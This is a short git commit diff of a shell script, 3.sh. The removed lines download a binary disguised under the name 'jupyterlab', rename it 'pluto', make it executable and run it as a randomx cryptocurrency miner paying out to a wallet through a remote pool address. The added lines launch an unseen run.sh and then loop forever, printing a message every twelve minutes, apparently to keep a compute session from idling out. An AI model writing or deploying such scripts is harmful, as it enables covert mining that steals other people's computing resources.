d34ae4a5efae1c3d29f752149faa8de0230931c0
Shin <dirianda187@gmail.com>
2026-08-09 02:18:09 +0700

    Update 3.sh

--- 3.sh
+++ 3.sh
@@ -1,4 +1,9 @@
-cd
-curl -s -L -o pluto https://github.com/Dirianda12/mainble/releases/download/mx/jupyterlab
-chmod 777 pluto
-./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p ver3 -t 3
+#!/bin/bash
+
+cd app && chmod 777 run.sh && nproc --all && ./run.sh 2 app-1
+sleep 60
+while true
+do
+        echo "...19 ULO PITON..."
+        sleep 720
+done
